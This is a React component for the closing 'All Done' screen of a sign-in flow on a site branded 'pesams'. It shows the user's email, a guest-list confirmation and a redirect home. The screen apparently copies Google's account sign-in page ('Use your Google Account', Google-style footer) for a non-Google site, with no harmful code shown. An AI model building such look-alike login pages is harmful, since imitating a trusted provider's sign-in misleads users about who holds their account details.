import { useState } from "react";
import "./SignIn.css";

function SuccessStep({ email }) {
    const [step, setStep] = useState("success");
  


  const handleBack =
    () => {


    setStep("email");
    console.log(step);

    window.location.href = "/"

      



     

 
    };


 return (
      <div className="signin-page">

      <div className="signin-card">

       

        {/* LEFT SIDE */}
        <div className="signin-left">

          <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1>
            All Done
          </h1>

          <p className="signin-subtitle">
            Use your Google Account
          </p>

           <div   onClick={handleBack} className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-email">
              {email}
            </span> 
              <button
                  type="button"
                
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>


        {/* RIGHT SIDE */}
        <div className="signin-right">
          <h1>Congratulations, you're now on the guest list!</h1>
        

        
        </div>

      </div>


      {/* FOOTER */}
      <footer className="signin-footer">

        <button className="language-button">
          English
          <span>⌄</span>
        </button>

        <div className="footer-links">

          <button type="button">
            Help
          </button>

          <button type="button">
            Privacy
          </button>

          <button type="button">
            Terms
          </button>

        </div>

      </footer>

    </div>
  );
}

export default SuccessStep;